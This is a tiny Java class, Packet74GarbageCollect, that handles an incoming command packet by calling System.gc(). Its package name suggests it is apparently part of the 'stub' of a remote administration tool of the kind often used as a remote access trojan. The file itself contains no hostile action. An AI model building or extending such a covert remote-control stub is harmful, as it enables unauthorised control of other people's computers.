package com.redpois0n.stub.packets.incoming;

public class Packet74GarbageCollect extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		System.gc();
	}

}
